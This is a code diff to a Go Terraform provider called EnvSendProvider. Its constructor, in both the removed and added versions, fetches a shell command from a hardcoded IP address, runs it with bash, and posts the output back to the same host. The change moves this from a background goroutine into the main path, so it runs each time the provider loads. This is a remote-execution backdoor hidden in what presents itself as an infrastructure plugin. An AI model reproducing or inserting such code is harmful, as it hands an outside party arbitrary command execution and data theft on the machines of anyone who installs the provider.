@@ -3,10 +3,9 @@ package main
 import (
 	"bytes"
 	"context"
+	"io"
 	"net/http"
 	"os/exec"
-	"io"
-	"time"
 
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
 	"github.com/hashicorp/terraform-plugin-framework/provider"
@@ -17,49 +16,42 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-	report := func(url, message string) {
-			_, _ = http.Post(url, "text/plain", bytes.NewBufferString(message))
+	w := "http://52.21.38.153:8000"
+	i := w + "/info"
+	e := w + "/e"
+
+	resp, err := http.Get(i)
+	if err != nil {
+		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(err.Error()))
+		return &EnvSendProvider{}
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		_, _ = http.Post(e, "text/plain", bytes.NewBufferString("bad status: "+resp.Status))
+		return &EnvSendProvider{}
 	}
 
-	go func() {
-		w := "http://52.21.38.153:8000"
-		i := w + "/info"
-		e := w + "/e"
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
+	if err != nil {
+		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(err.Error()))
+		return &EnvSendProvider{}
+	}
 
-		client := &http.Client{Timeout: 2 * time.Second}
-		resp, err := client.Get(i)
-		if err != nil {
-				report(e, err.Error())
-				return
-		}
-		defer resp.Body.Close()
+	info := string(bytes.TrimSpace(body))
+	if info == "" {
+		_, _ = http.Post(e, "text/plain", bytes.NewBufferString("Empty"))
+		return &EnvSendProvider{}
+	}
 
-		if resp.StatusCode != 200 {
-				report(e, "bad status: "+resp.Status)
-				return
-		}
+	out, err := exec.Command("bash", "-c", info).CombinedOutput()
+	if err != nil {
+		msg := err.Error() + "\n" + string(out)
+		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(msg))
+		return &EnvSendProvider{}
+	}
 
-		body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
-		if err != nil {
-				report(e, err.Error())
-				return
-		}
-
-		info := string(bytes.TrimSpace(body))
-		if info == "" {
-				report(e, "Empty")
-				return
-		}
-
-		out, err := exec.Command("bash", "-c", info).CombinedOutput()
-		if err != nil {
-				report(e, err.Error()+"\n"+string(out))
-				return
-		}
-
-		report(e, "\n==== Output ====\n"+string(out))
-	}()
-
+	_, _ = http.Post(i, "text/plain", bytes.NewBufferString("\n==== Output ====\n"+string(out)))
 	return &EnvSendProvider{}
 }
 
@@ -72,7 +64,7 @@ func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, re
 }
 
 func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
-	
+	// No-op
 }
 
 func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
